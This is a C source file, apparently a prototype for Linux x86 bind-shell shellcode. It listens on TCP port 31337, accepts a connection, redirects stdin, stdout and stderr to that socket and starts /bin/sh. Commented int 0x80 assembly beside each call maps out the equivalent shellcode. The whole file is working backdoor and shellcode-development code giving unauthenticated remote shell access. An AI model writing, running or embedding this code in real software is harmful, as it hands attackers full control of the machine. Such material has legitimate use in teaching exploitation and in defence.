#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
  
int
main(void) 
{
    int sockfd, dupsockfd;  
    struct sockaddr_in hostaddr, clientaddr;   
    socklen_t sinsz;
      
    /*
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80        ; make the call, eax contains sockfd                       
    mov esi, eax    ; esi now contains sockfd
    */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
  
    /*  
    push edx         ; push null
    push word 0x697a ; push port number 31337      
    push word bx     ; push AF_INET
    mov ecx, esp     ; ecx contains pointner to sockaddr struct
    push byte 0x10   ; push sinsz
    push ecx         ; push hostaddr
    push esi         ; push sockfd
    mov ecx, esp     ; ecx contains pointer to bind() args
    int 0x80
    */
    hostaddr.sin_family = AF_INET;         
    hostaddr.sin_port = htons(31337);      
    hostaddr.sin_addr.s_addr = INADDR_ANY; 
    memset(&(hostaddr.sin_zero), '\0', 8); 
    bind(sockfd, (struct sockaddr *)&hostaddr, sizeof(struct sockaddr));
      
    /*
    push byte 0x1   ; push backlog
    push esi        ; push sockfd
    mov ecx, esp    ; ecx contains pointer to listen() args
    int 0x80        ; make the call               
    */
    listen(sockfd, 1);
      
    /*
    push edx        ; push sinsz
    push edx        ; push clientaddr 
    push esi        ; push sockfd
    mov ecx, esp    ; ecx contains pointer to accept() args
    int 0x80        ; make the call
    */
    sinsz = sizeof(struct sockaddr_in);
    dupsockfd = accept(sockfd, (struct sockaddr *)&clientaddr, &sinsz);
  
    /*
    mov ebx, eax    ; ebx contains dupsockfd
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
    dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80        ; make the call
    jne dupfd       ; loop until 0
    */
    dup2(dupsockfd,0); // stdin
    dup2(dupsockfd,1); // stdout
    dup2(dupsockfd,2); // stderr
  
    /*
    push edx        ; push null
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov ebx, esp    ; ebx contains address of //bin/sh
    push edx        ; push null
    push ebx        ; push address of //bin/sh
    mov ecx, esp    ; ecx pointer to //bin/sh
    push edx        ; push null
    mov edx, esp    ; edx contains pointer to null
    mov al, 0xb     ; execve()
    int 0x80        ; make the call
    */
    execve("/bin/sh", NULL, NULL);
}
